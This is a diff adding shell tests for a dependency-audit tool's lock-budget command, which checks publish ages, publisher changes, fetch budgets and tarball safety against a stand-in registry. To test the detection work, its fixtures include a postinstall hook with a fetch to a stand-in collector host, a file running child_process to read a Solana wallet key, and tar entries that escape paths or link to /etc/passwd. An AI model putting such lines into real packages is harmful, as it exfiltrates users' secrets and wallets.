@@ -1087,8 +1087,7 @@ check "... git ran ls-tree and cat-file --batch, and never clone" \
 check "... and no program or hook the repository's config names ran" test -z "$(ls -A "$T/marks")"
 # A source that borrows objects (git clone --shared writes objects/info/alternates). Outside strict mode
 # confine_repo takes it with a note, which prints on stdout as target.sh's own notes do, and the clone reads
-# the borrowed objects; strict mode refuses it, as today. (The default-mode case needs Lane 1's confine_repo,
-# lane/l1-core a36bdba.)
+# the borrowed objects; strict mode refuses it, as today.
 AL=$T/alwt
 tgit clone -q --shared "$WT" "$AL" 2>/dev/null
 ( cd "$AL" && "$ROOT/scripts/rundir.sh" new audit ) >/dev/null && printf 'native\n' > "$AL/audit_1/exec-mode"
@@ -2193,6 +2192,407 @@ ln "$DT" "$T/dt.hardlink"
 run "$DEPS" "$WT" -- npm-view --run audit_1 left-pad
 check "... and so is one with a second hard link" sh -c "[ '$RC' = 64 ] && [ ! -s '$T/calls' ]"
 rm -f "$T/dt.hardlink"
+
+# lock-budget: the CI budget over a set lock-delta.sh set wrote, against the same stand-in registry. The
+# publish ages come from one record per name, asked in the budget's order; the budget's entries are fetched
+# old and new and compared; a source that is not public is never sent; one disclosure row per service.
+python3 -I - "$T/fix" <<'PY'
+import base64, hashlib, io, json, os, sys, tarfile, time
+fix = sys.argv[1]
+def put(url, data, status=None):
+    key = url.replace("/", "_").replace(":", "_").replace("%", "_").replace("@", "_")
+    open(os.path.join(fix, key), "wb").write(data if isinstance(data, bytes) else data.encode())
+    if status:
+        open(os.path.join(fix, key + ".status"), "w").write(str(status))
+def tgz(top, files):
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w:gz") as t:
+        for name, data in sorted(files.items()):
+            ti = tarfile.TarInfo(top + "/" + name)
+            ti.size = len(data)
+            t.addfile(ti, io.BytesIO(data))
+    return buf.getvalue()
+def iso(days):
+    return time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime(time.time() - days * 86400))
+def npm(name, versions, status=None):
+    doc = {"name": name, "time": {}, "versions": {}}
+    for v, (days, who, files) in versions.items():
+        data = tgz("package", files)
+        url = "https://registry.npmjs.org/%s/-/%s-%s.tgz" % (name, name, v)
+        put(url, data, status)
+        rec = {"name": name, "version": v, "_npmUser": {"name": who},
+               "dist": {"tarball": url, "integrity": "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()}}
+        doc["time"][v] = iso(days)
+        doc["versions"][v] = rec
+        put("https://registry.npmjs.org/%s/%s" % (name, v), json.dumps(rec))
+    put("https://registry.npmjs.org/" + name, json.dumps(doc))
+plain = {"package.json": b"{\"name\": \"x\"}\n", "index.js": b"module.exports = 1;\n"}
+npm("lb-direct", {"1.0.0": (400, "alice", plain),
+                  "1.1.0": (3, "mallory", {"package.json": b"{\"name\": \"x\", \"scripts\": {\"postinstall\": \"node i.js\"}}\n",
+                                           "index.js": b"module.exports = 1;\nfetch(\"https://collector.invalid/k\");\n"})})
+npm("lb-meta", {"1.0.0": (900, "bob", plain), "2.0.0": (500, "bob", plain)})
+npm("lb-young", {"0.1.0": (1, "eve", plain)})
+npm("lb-fail", {"1.0.0": (300, "carol", plain)}, 500)
+for i in range(1, 46):
+    npm("lb-many-%d" % i, {"1.0.0": (300, "dave", plain)})
+npm("lb-keyed", {"1.0.0": (300, "frank", plain)})
+npm("lb-ci", {"1.0.0": (400, "alice", plain), "1.1.0": (100, "GitHub Actions", plain)})
+crates = {}
+for v, files in (("0.1.0", {"Cargo.toml": b"[package]\n"}), ("0.2.0", {"Cargo.toml": b"[package]\n", "build.rs": b"fn main() {}\n"})):
+    data = tgz("lb_crate-" + v, files)
+    put("https://static.crates.io/crates/lb_crate/lb_crate-%s.crate" % v, data)
+    crates[v] = {"num": v, "crate": "lb_crate", "created_at": iso(200 if v == "0.1.0" else 100).replace("Z", "+00:00"),
+                 "published_by": {"login": "ferris"}, "checksum": hashlib.sha256(data).hexdigest()}
+    put("https://crates.io/api/v1/crates/lb_crate/" + v, json.dumps({"version": crates[v]}))
+put("https://crates.io/api/v1/crates/lb_crate", json.dumps({"versions": list(crates.values())}))
+# the crates.io index: one line per version, its pubtime and checksum; lb_nt has no pubtime
+put("https://index.crates.io/lb/_c/lb_crate", "".join(json.dumps({"name": "lb_crate", "vers": v, "deps": [], "cksum": c["checksum"],
+    "features": {}, "yanked": False, "pubtime": c["created_at"].replace("+00:00", "Z")}) + "\n" for v, c in sorted(crates.items())))
+put("https://index.crates.io/lb/_n/lb_nt", json.dumps({"name": "lb_nt", "vers": "1.0.0", "deps": [], "cksum": "0" * 64, "features": {}, "yanked": False}) + "\n")
+def crate(name, pubs, pubtime=True):
+    # crates.io's record of each version (a release made by trusted publishing, "CI", has trustpub_data and no
+    # published_by), its index line and its .crate
+    vers = {}
+    for v, who, days, yanked in pubs:
+        data = tgz("%s-%s" % (name, v), {"Cargo.toml": b"[package]\n"})
+        put("https://static.crates.io/crates/%s/%s-%s.crate" % (name, name, v), data)
+        rec = {"num": v, "crate": name, "created_at": iso(days).replace("Z", "+00:00"), "checksum": hashlib.sha256(data).hexdigest(), "yanked": yanked}
+        if who == "CI":
+            rec["published_by"], rec["trustpub_data"] = None, {"provider": "github", "repository": "owner/" + name}
+        else:
+            rec["published_by"] = {"login": who}
+        vers[v] = rec
+    put("https://crates.io/api/v1/crates/" + name, json.dumps({"versions": list(vers.values())}))
+    put("https://index.crates.io/%s/%s/%s" % (name[:2], name[2:4], name), "".join(json.dumps(dict({"name": name, "vers": v, "deps": [],
+        "cksum": c["checksum"], "features": {}, "yanked": c["yanked"]}, **({"pubtime": c["created_at"].replace("+00:00", "Z")} if pubtime else {}))) + "\n"
+        for v, c in sorted(vers.items())))
+crate("lb_tp_to_person", (("0.1.0", "CI", 300, False), ("0.2.0", "mallory", 100, False)))
+crate("lb_person_to_tp", (("0.1.0", "alice", 300, False), ("0.2.0", "CI", 100, False)))
+crate("lb_nty", (("0.9.0", "ferris", 300, False), ("1.0.0", "mallory", 100, True)), pubtime=False)
+put("https://pypi.org/pypi/lb-py/json", json.dumps({"releases": {"1.0": [{"upload_time_iso_8601": iso(2)}]}}))
+PY
+H='eco	lockfile	name	old	new	oldsource	source	marks'
+lb_set() { # lb_set <n> <row>...: audit_1/deps/lock-set-<n>.tsv, the header and the rows
+  { printf '%s\n' "$H"; shift; for r in "$@"; do printf '%s\n' "$r"; done; } > "$WT/audit_1/deps/lock-set-$LBN.tsv"
+}
+LBN=101
+lb_set "$LBN" 'npm	package-lock.json	lb-direct	1.0.0	1.1.0	public	public	direct' \
+  'npm	package-lock.json	lb-meta	-	2.0.0	-	public	-' \
+  'npm	package-lock.json	lb-young	-	0.1.0	-	public	-' \
+  'crates	Cargo.lock	lb_crate	0.1.0	0.2.0	public	public	pin' \
+  'npm	package-lock.json	lb-git	-	1.0.0	-	git	-' \
+  'pypi	uv.lock	lb-py	-	1.0	-	public	direct'
+r0=$(rows)
+run "$DEPS" "$WT" HTTPS_PROXY="$PROXY" -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+n=$(sed -n 's/^>> lock-budget: .*lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/out")
+LB=$WT/audit_1/deps/lock-budget-$n
+check "lock-budget: one record per public name, eight at a time, a crate's from the index; then the selected crate's publisher; none for a git source" \
+  sh -c "[ '$RC' = 1 ] && lb=\$(sed -n 's/^url: //p' '$T/calls' | sed -n 1,5p | LC_ALL=C sort | tr '\n' ' ') && [ \"\$lb\" = 'https://index.crates.io/lb/_c/lb_crate https://pypi.org/pypi/lb-py/json https://registry.npmjs.org/lb-direct https://registry.npmjs.org/lb-meta https://registry.npmjs.org/lb-young ' ] && [ \"\$(sed -n 's/^url: //p' '$T/calls' | sed -n 6p)\" = https://crates.io/api/v1/crates/lb_crate ] && ! grep -q 'lb-git' '$T/calls'"
+check "... the npm record asked compressed, with the proxy" \
+  sh -c "grep -q '^== curl -q --proto =https --proto-redir =https --tlsv1.2 -sS --connect-timeout 30 --max-time [0-9]* --max-filesize 104857600 -A .* -H Accept: application/json --compressed -o .* -- https://registry.npmjs.org/lb-direct\$' '$T/calls' && grep -qxF 'env: HTTPS_PROXY=$PROXY' '$T/calls'"
+check "... the publish ages: three under 14 days, two first releases, a publisher who published no earlier version" \
+  sh -c "grep -q '^>> publish age: 5 names asked in [0-9]* s; not checked: 0 of 5 rows; under 14 days: 3; first releases: 2; publisher changes: 1; from a person to CI publishing: 0; yanked: 0; not listed by the registry: 0; crate publishers, the selected crates only: 1 asked, 0 not checked\$' '$T/out' && grep -q '^crates	lb_crate	0.2.0	[0-9T:Z-]*	100	ferris	ferris	-\$' '$LB/ages.tsv' && grep -q '^npm	lb-direct	1.1.0	[0-9T:Z-]*	3	mallory	alice	young,publisher-change\$' '$LB/ages.tsv'"
+check "... the budget: direct, pin, then the young version; the old package metadata only, the git row never fetched" \
+  sh -c "grep -qxF '>> budget: 0 key handlers to compare, outside the 40-entry budget; 3 entries to compare (direct 1, pin 1, install 0, young 1, source-change 0); over the 40-entry budget: 0; metadata only: 1; PyPI rows, metadata only: 1; same version with a new checksum: 0; not public, never fetched (SC-061): 1; a version outside its registry grammar, never sent: 0' '$T/out' && ! grep -q 'lb-meta/-/' '$T/calls'"
+check "... old and new fetched from the URLs the records give (the npm record from the age answer, the crate's from the index, neither asked again), and compared" \
+  sh -c "grep -qxF '>> artifacts: 3 entries, 5 artifacts fetched, 0 failed' '$T/out' && [ \$(grep -c '^url: https://registry.npmjs.org/lb-direct/1.1.0\$' '$T/calls') = 0 ] && ! grep -q '^url: https://crates.io/api/v1/crates/lb_crate/' '$T/calls' && [ -f '$LB/1/new/files/package/index.js' ] && [ -f '$LB/1/old/files/package/index.js' ] && [ -f '$LB/2/new/files/lb_crate-0.2.0/build.rs' ]"
+check "... the sweep, counts first: the new postinstall and build.rs (SC-059), the new fetch (SC-060)" \
+  sh -c "grep -qxF '>> sweep: SC-059 2 hits in 2 entries, SC-060 1 hits in 1 entries, binary files added or changed 0 in 0 entries; the hits are in the report' '$T/out' && grep -q '^1. npm lb-direct 1.0.0 -> 1.1.0 \[direct,young\] SC-059 1, SC-060 1, binary 0; files +0 ~2 -0\$' '$LB.txt' && grep -qF 'SC-060 package/index.js:2: fetch(\"https://collector.invalid/k\");' '$LB.txt' && grep -q '^SC-059 lb_crate-0.2.0/build.rs:0: a build.rs file added\$' '$LB.txt'"
+check "... one disclosure row per service for the whole run, each naming the set" \
+  sh -c "[ \$(( \$(wc -l < '$DT') - 1 - $r0 )) = 3 ] && tail -n 3 '$DT' | cut -f3 | tr '\n' ' ' | grep -qxF 'npmjs.org crates.io pypi.org ' && [ \$(tail -n 3 '$DT' | grep -c 'audit_1/deps/lock-set-$LBN.tsv	1\$') = 3 ]"
+check "... the run directory still passes its check" sh -c "(cd '$WT' && '$ROOT/scripts/rundir.sh' check audit_1) >/dev/null"
+r0=$(rows)
+run "$DEPS" "$WT" AUDITOR_PUBLISH_AGE=off -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+check "lock-budget with AUDITOR_PUBLISH_AGE=off: no record of a whole package, each version's record instead (60 seconds a request), nothing to PyPI or the index" \
+  sh -c "[ '$RC' = 1 ] && ! grep -q 'index.crates.io' '$T/calls' && grep -q '^== curl .* --max-time 60 .* -- https://registry.npmjs.org/lb-direct/1.1.0\$' '$T/calls' && grep -q '^== curl .* --max-time 60 .* -- https://crates.io/api/v1/crates/lb_crate/0.2.0\$' '$T/calls' && grep -q '^== curl .* --max-time 120 .* -- https://registry.npmjs.org/lb-direct/-/lb-direct-1.1.0.tgz\$' '$T/calls' && grep -q '^>> publish age: off (AUDITOR_PUBLISH_AGE=off): not checked: 5 of 5 rows\$' '$T/out' && ! grep -qxF 'url: https://registry.npmjs.org/lb-direct' '$T/calls' && grep -qxF 'url: https://registry.npmjs.org/lb-direct/1.1.0' '$T/calls' && ! grep -q 'pypi.org' '$T/calls' && grep -q '^>> budget: 0 key handlers to compare, outside the 40-entry budget; 2 entries to compare (direct 1, pin 1, ' '$T/out'"
+check "... two rows, npmjs.org and crates.io, that say only the selected versions go out" \
+  sh -c "[ \$(( \$(wc -l < '$DT') - 1 - $r0 )) = 2 ] && tail -n 2 '$DT' | grep -c 'budget selects' | grep -qx 2"
+LBN=102
+lb_set "$LBN" 'npm	package-lock.json	lb-fail	-	1.0.0	-	public	install' 'npm	package-lock.json	lb-direct	1.0.0	1.1.0	public	public	direct'
+run "$DEPS" "$WT" -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+n=$(sed -n 's/.*; output audit_1\/deps\/lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/err")
+check "lock-budget: an artifact that still fails after one retry: exit 3 with the count, once the rest are compared" \
+  sh -c "[ '$RC' = 3 ] && grep -qxF 'deps: blocker: 1 of 3 selected artifacts could not be fetched; output audit_1/deps/lock-budget-$n.txt' '$T/err' && [ \$(grep -c '^url: https://registry.npmjs.org/lb-fail/-/lb-fail-1.0.0.tgz\$' '$T/calls') = 2 ] && grep -q '^1. npm lb-direct 1.0.0 -> 1.1.0 \[direct,young\] SC-059 1' '$WT/audit_1/deps/lock-budget-$n.txt' && grep -q '^  not fetched: npm lb-fail 1.0.0: HTTP 500 from ' '$WT/audit_1/deps/lock-budget-$n.txt'"
+LBN=103
+rowsfile=()
+for i in $(seq 1 45); do rowsfile+=("npm	package-lock.json	lb-many-$i	-	1.0.0	-	public	direct"); done
+lb_set "$LBN" "${rowsfile[@]}"
+run "$DEPS" "$WT" AUDITOR_PUBLISH_AGE=off -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+n=$(sed -n 's/^>> lock-budget: .*lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/out")
+check "lock-budget over 45 direct entries: the first 40 compared, 5 counted over the budget and never fetched" \
+  sh -c "[ '$RC' = 0 ] && grep -q '^>> budget: 0 key handlers to compare, outside the 40-entry budget; 40 entries to compare (direct 40, .*); over the 40-entry budget: 5; ' '$T/out' && grep -qxF '>> artifacts: 40 entries, 40 artifacts fetched, 0 failed' '$T/out' && grep -qxF 'url: https://registry.npmjs.org/lb-many-40/-/lb-many-40-1.0.0.tgz' '$T/calls' && ! grep -q 'lb-many-4[1-5]' '$T/calls' && grep -qxF '  npm lb-many-45 - -> 1.0.0 [direct]' '$WT/audit_1/deps/lock-budget-$n.txt'"
+LBN=108
+rowsfile=()
+for i in $(seq 1 45); do rowsfile+=("npm	package-lock.json	lb-many-$i	-	1.0.0	-	public	direct"); done
+rowsfile+=('npm	package-lock.json	lb-keyed	-	1.0.0	-	public	key')
+lb_set "$LBN" "${rowsfile[@]}"
+run "$DEPS" "$WT" AUDITOR_PUBLISH_AGE=off -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+n=$(sed -n 's/^>> lock-budget: .*lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/out")
+check "lock-budget: a key handler listed after 45 direct entries is compared first, outside the 40" \
+  sh -c "[ '$RC' = 0 ] && grep -q '^>> budget: 1 key handlers to compare, outside the 40-entry budget; 40 entries to compare (direct 40, .*); over the 40-entry budget: 5; ' '$T/out' && [ \"\$(sed -n 's/^url: \(.*[.]tgz\)\$/\1/p' '$T/calls' | sed -n 1p)\" = 'https://registry.npmjs.org/lb-keyed/-/lb-keyed-1.0.0.tgz' ] && grep -qxF '1. npm lb-keyed - -> 1.0.0 [key] SC-059 0, SC-060 0, binary 0; files +2 ~0 -0; no earlier public version: every file is new' '$WT/audit_1/deps/lock-budget-$n.txt' && grep -qxF '>> artifacts: 41 entries, 41 artifacts fetched, 0 failed' '$T/out'"
+LBN=110
+lb_set "$LBN" 'npm	package-lock.json	lb-ci	1.0.0	1.1.0	public	public	-'
+run "$DEPS" "$WT" -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+n=$(sed -n 's/^>> lock-budget: .*lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/out")
+check "lock-budget: a person to GitHub Actions is reported as a change to CI publishing, at low severity, not as a publisher change" \
+  sh -c "grep -q '; publisher changes: 0; from a person to CI publishing: 1;' '$T/out' && grep -qxF '  publisher changed from a person to CI publishing (trusted publishing; low severity): npm lb-ci 1.1.0 (package-lock.json): GitHub Actions (earlier: alice)' '$WT/audit_1/deps/lock-budget-$n.txt'"
+LBN=116
+lb_set "$LBN" 'crates	Cargo.lock	lb_nt	-	1.0.0	-	public	-'
+run "$DEPS" "$WT" -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+check "lock-budget: a crate whose index entry has no pubtime is not checked, and a crate the budget does not select is never asked for its publisher" \
+  sh -c "[ '$RC' = 0 ] && grep -q '^>> publish age: 1 names asked in [0-9]* s; not checked: 1 of 1 rows (no publish time);' '$T/out' && grep -qxF 'url: https://index.crates.io/lb/_n/lb_nt' '$T/calls' && ! grep -q 'crates.io/api' '$T/calls'"
+# crates.io's trusted publishing, both ways: a person to it is the change to CI publishing npm's GitHub Actions is;
+# from it to a person, a publisher change
+LBN=122
+lb_set "$LBN" 'crates	Cargo.lock	lb_tp_to_person	0.1.0	0.2.0	public	public	direct' 'crates	Cargo.lock	lb_person_to_tp	0.1.0	0.2.0	public	public	direct'
+run "$DEPS" "$WT" -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+n=$(sed -n 's/^>> lock-budget: .*lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/out")
+check "lock-budget: a crate from a person to trusted publishing is a change to CI publishing, at low severity; from it to a person, a publisher change" \
+  sh -c "[ '$RC' = 1 ] && grep -q '; publisher changes: 1; from a person to CI publishing: 1; .*; crate publishers, the selected crates only: 2 asked, 0 not checked\$' '$T/out' && grep -qxF '  publisher changed from a person to CI publishing (trusted publishing; low severity): crates lb_person_to_tp 0.2.0 (Cargo.lock): trusted publishing (earlier: alice)' '$WT/audit_1/deps/lock-budget-$n.txt' && grep -qxF '  published by an account that published no earlier version: crates lb_tp_to_person 0.2.0 (Cargo.lock): mallory (earlier: trusted publishing)' '$WT/audit_1/deps/lock-budget-$n.txt'"
+# a selected crate whose index line has no pubtime: not checked for its age, yet its yanked flag is kept and its
+# publisher checked
+LBN=123
+lb_set "$LBN" 'crates	Cargo.lock	lb_nty	-	1.0.0	-	public	direct'
+run "$DEPS" "$WT" -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+check "lock-budget: a selected crate with no pubtime keeps its yanked flag and has its publisher checked" \
+  sh -c "[ '$RC' = 1 ] && grep -q '^>> publish age: 1 names asked in [0-9]* s; not checked: 1 of 1 rows (no publish time); under 14 days: 0; first releases: 0; publisher changes: 1; from a person to CI publishing: 0; yanked: 1; not listed by the registry: 0; crate publishers, the selected crates only: 1 asked, 0 not checked\$' '$T/out'"
+# a scoped npm package the public registry does not list may be private to its organization: never fetched, and
+# no failure; an unscoped one stays a failure when selected
+LBN=117
+lb_set "$LBN" 'npm	package-lock.json	@lbpriv/tool	-	1.0.0	-	public	direct'
+run "$DEPS" "$WT" -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+n=$(sed -n 's/^>> lock-budget: .*lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/out")
+check "lock-budget: a scoped package the public registry does not list is maybe private: never fetched, no failure" \
+  sh -c "[ '$RC' = 0 ] && grep -q '; scoped packages the public registry does not list, maybe private, never fetched: 1\$' '$T/out' && grep -qxF 'url: https://registry.npmjs.org/@lbpriv%2Ftool' '$T/calls' && [ \$(grep -c '^url: ' '$T/calls') = 1 ] && grep -qxF '  the public registry does not list this scoped package; it may be private: npm @lbpriv/tool 1.0.0 (package-lock.json)' '$WT/audit_1/deps/lock-budget-$n.txt'"
+check "... counted apart, not as a version outside its registry grammar" sh -c "grep -q '; a version outside its registry grammar, never sent: 0\$' '$T/out'"
+check "... and the output says once that a registry set outside the repository is not seen" \
+  sh -c "[ \$(grep -c '^>> note: a registry set outside the repository (the environment, user or global npm or bun config) is not seen\$' '$T/out') = 1 ]"
+run "$DEPS" "$WT" AUDITOR_PUBLISH_AGE=off -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+check "lock-budget with AUDITOR_PUBLISH_AGE=off: a scoped package whose version record is 404 is maybe private, no failure" \
+  sh -c "[ '$RC' = 0 ] && grep -qxF '>> artifacts: 1 entries, 0 artifacts fetched, 0 failed; 1 scoped packages the public registry does not list, maybe private, never fetched' '$T/out' && [ \$(grep -c '^url: ' '$T/calls') = 1 ]"
+LBN=118
+lb_set "$LBN" 'npm	package-lock.json	lb-nowhere	-	1.0.0	-	public	direct'
+run "$DEPS" "$WT" AUDITOR_PUBLISH_AGE=off -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+check "lock-budget: an unscoped package the registry does not list stays a failure when selected" \
+  sh -c "[ '$RC' = 3 ] && grep -q '^deps: blocker: 1 of 1 selected artifacts could not be fetched; output ' '$T/err'"
+# a scoped package the registry has a record of, at a version it does not list: flagged, and a failed fetch, not a
+# private package
+python3 -I - "$T/fix" <<'PY'
+import json, os, sys
+key = "https://registry.npmjs.org/@lbpub%2Fkit".replace("/", "_").replace(":", "_").replace("%", "_").replace("@", "_")
+open(os.path.join(sys.argv[1], key), "w").write(json.dumps({"name": "@lbpub/kit", "time": {"1.0.0": "2020-01-01T00:00:00.000Z"},
+    "versions": {"1.0.0": {"name": "@lbpub/kit", "version": "1.0.0", "_npmUser": {"name": "alice"}}}}))
+PY
+LBN=125
+lb_set "$LBN" 'npm	package-lock.json	@lbpub/kit	-	2.0.0	-	public	direct'
+run "$DEPS" "$WT" -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+n=$(sed -n 's/.*; output audit_1\/deps\/lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/err")
+check "lock-budget: a scoped package with a registry record, at a version it does not list, is flagged and fails its fetch, not taken as private" \
+  sh -c "[ '$RC' = 3 ] && grep -q '; not listed by the registry: 1' '$T/out' && grep -qxF '  not fetched: npm @lbpub/kit 2.0.0: HTTP 404 from https://registry.npmjs.org/@lbpub%2Fkit/2.0.0' '$WT/audit_1/deps/lock-budget-$n.txt' && ! grep -q 'maybe private' '$T/out'"
+LBN=104
+lb_set "$LBN"
+r0=$(rows)
+run "$DEPS" "$WT" -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+r1=$(rows)
+check "lock-budget over an empty set: exit 0, no request and no disclosure row" \
+  sh -c "[ '$RC' = 0 ] && grep -q '^>> lock-budget: nothing flagged: audit_1/deps/lock-budget-[0-9]*[.]txt\$' '$T/out' && ! grep -q '^== curl' '$T/calls' && [ '$r1' = '$r0' ]"
+LBN=105
+lb_set "$LBN" 'npm	package-lock.json	../lb-up	-	1.0.0	-	public	direct' 'npm	package-lock.json	lb-meta	-	2.0.0	-	public	-'
+run "$DEPS" "$WT" -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+n=$(sed -n 's/^>> lock-budget: .*lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/out")
+check "lock-budget: a row whose name is outside npm's grammar is never sent" \
+  sh -c "[ '$RC' = 0 ] && ! grep -q 'lb-up' '$T/calls' && grep -qxF 'url: https://registry.npmjs.org/lb-meta' '$T/calls' && grep -q '; 1 lines that are not a row of the set, never sent\$' '$WT/audit_1/deps/lock-budget-$n.txt'"
+run "$DEPS" "$WT" AUDITOR_PUBLISH_AGE=maybe -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+check "lock-budget: an AUDITOR_PUBLISH_AGE other than on or off is refused before any request" \
+  sh -c "[ '$RC' = 64 ] && grep -qxF \"deps: refused: AUDITOR_PUBLISH_AGE is 'maybe', not on or off\" '$T/err' && [ ! -s '$T/calls' ]"
+# an npm tarball with two first folders, whose second copy of index.js is the one npm keeps, and an entry
+# whose name is not UTF-8; a package the registry has no record of; a call out of time
+python3 -I - "$T/fix" <<'PY'
+import base64, hashlib, io, json, os, sys, tarfile, time, zlib
+fix = sys.argv[1]
+def put(url, data):
+    key = url.replace("/", "_").replace(":", "_").replace("%", "_").replace("@", "_")
+    open(os.path.join(fix, key), "wb").write(data if isinstance(data, bytes) else data.encode())
+buf = io.BytesIO()
+with tarfile.open(fileobj=buf, mode="w:gz", format=tarfile.PAX_FORMAT, encoding="utf-8", errors="surrogateescape") as t:
+    for name, data in (("package/package.json", b"{\"name\": \"lb-twotop\"}\n"), ("package/index.js", b"module.exports = 1;\n"),
+                       ("evil/index.js", b"require(\"child_process\").exec(\"cat ~/.config/solana/id.json\");\n"),
+                       ("package/odd-\udcff.js", b"x\n")):
+        ti = tarfile.TarInfo(name)
+        ti.size = len(data)
+        t.addfile(ti, io.BytesIO(data))
+data = buf.getvalue()
+url = "https://registry.npmjs.org/lb-twotop/-/lb-twotop-1.0.0.tgz"
+put(url, data)
+rec = {"name": "lb-twotop", "version": "1.0.0", "_npmUser": {"name": "eve"},
+       "dist": {"tarball": url, "integrity": "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()}}
+put("https://registry.npmjs.org/lb-twotop", json.dumps({"name": "lb-twotop", "time": {"1.0.0": "2020-01-01T00:00:00.000Z"}, "versions": {"1.0.0": rec}}))
+put("https://registry.npmjs.org/lb-flaky", "{}")
+open(os.path.join(fix, "https___registry.npmjs.org_lb-flaky.status"), "w").write("500")
+put("https://registry.npmjs.org/lb-notime", json.dumps({"name": "lb-notime", "time": {}, "versions": {"1.0.0": {"name": "lb-notime", "version": "1.0.0", "_npmUser": {"name": "gus"}}}}))
+# the bounds and the checks every selected artifact passes: a download over 50 MB, one that declares more than the
+# call's 500 MB unpacked, one whose digest does not match, and one whose entries climb out, sit at an absolute
+# path or are links
+def record(name, data, integrity=None):
+    url = "https://registry.npmjs.org/%s/-/%s-1.0.0.tgz" % (name, name)
+    put(url, data)
+    rec = {"name": name, "version": "1.0.0", "_npmUser": {"name": "hal"},
+           "dist": {"tarball": url, "integrity": integrity or "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()}}
+    put("https://registry.npmjs.org/%s/1.0.0" % name, json.dumps(rec))
+record("lb-big", b"\0" * 50000001)
+record("lb-bigold", b"\0" * 50000001)
+open(os.path.join(fix, "https___registry.npmjs.org_lb-bigold_-_lb-bigold-1.0.0.tgz.nolength"), "w").close()
+info = tarfile.TarInfo("package/x")
+info.size = 501000000
+c = zlib.compressobj(9, zlib.DEFLATED, 31)
+record("lb-huge", c.compress(info.tobuf(tarfile.USTAR_FORMAT) + b"\0" * 1024) + c.flush())
+record("lb-baddigest", b"x" * 100, "sha512-" + base64.b64encode(b"\0" * 64).decode())
+buf = io.BytesIO()
+with tarfile.open(fileobj=buf, mode="w:gz") as t:
+    for name, kind in (("package/index.js", "file"), ("package/../escape.txt", "file"), ("/abs.txt", "file"), ("package/link", "sym")):
+        ti = tarfile.TarInfo(name)
+        if kind == "file":
+            ti.size = 3
+            t.addfile(ti, io.BytesIO(b"ok\n"))
+        else:
+            ti.type, ti.linkname = tarfile.SYMTYPE, "/etc/passwd"
+            t.addfile(ti)
+record("lb-unsafe", buf.getvalue())
+# a line longer than the 1 MiB the sweep reads at once, then a hit on line 2
+buf = io.BytesIO()
+with tarfile.open(fileobj=buf, mode="w:gz") as t:
+    data = b"-" * (1024 * 1024 + 100) + b"\n" + b"fetch(\"https://collector.invalid/k\");\n"
+    ti = tarfile.TarInfo("package/long.js")
+    ti.size = len(data)
+    t.addfile(ti, io.BytesIO(data))
+record("lb-long", buf.getvalue())
+# 120 MB of short lines, a 117 KB tarball: what the sweep holds must not grow with it
+big = b"ab\n" * 40000000
+buf = io.BytesIO()
+with tarfile.open(fileobj=buf, mode="w:gz") as t:
+    ti = tarfile.TarInfo("package/big.txt")
+    ti.size = len(big)
+    t.addfile(ti, io.BytesIO(big))
+record("lb-mem", buf.getvalue())
+class Repeat:
+    # <size> bytes of <unit> over and over, for tarfile to read a piece at a time
+    def __init__(self, unit, size):
+        self.unit, self.left, self.at = unit, size, 0
+    def read(self, n=-1):
+        n = self.left if n < 0 else min(n, self.left)
+        out = (self.unit * ((self.at + n) // len(self.unit) + 1))[self.at:self.at + n]
+        self.at, self.left = (self.at + n) % len(self.unit), self.left - n
+        return out
+# a call out of time while it sweeps; a call whose first artifact fills its 500 MB exactly
+for name, file, unit, size, level in (("lb-slow", "slow", (b"A" * 119 + b" ") * 10 + b"\n", 200000000, 9),
+                                      ("lb-fill", "zero", b"\0", 500000000, 1)):
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w:gz", compresslevel=level) as t:
+        ti = tarfile.TarInfo("package/" + file)
+        ti.size = size
+        t.addfile(ti, Repeat(unit, size))
+    record(name, buf.getvalue())
+record("lb-after", b"never asked")
+PY
+LBN=106
+lb_set "$LBN" 'npm	package-lock.json	lb-twotop	-	1.0.0	-	public	direct' 'npm	package-lock.json	lb-gone	-	3.0.0	-	public	-'
+run "$DEPS" "$WT" -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+n=$(sed -n 's/^>> lock-budget: .*lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/out")
+LBR=$WT/audit_1/deps/lock-budget-$n.txt
+check "lock-budget: two first folders in one tarball: the shared path and the folder flagged, every copy read whole" \
+  sh -c "[ '$RC' = 1 ] && grep -q '^SC-060 index.js:0: 2 entries of the artifact unpack to this path, and the package manager keeps one: evil/index.js, package/index.js\$' '$LBR' && grep -q '^SC-060 evil/index.js:0: an entry outside the package/ folder the registry puts every entry under\$' '$LBR' && grep -qF 'SC-060 evil/index.js:1: require(\"child_process\")' '$LBR'"
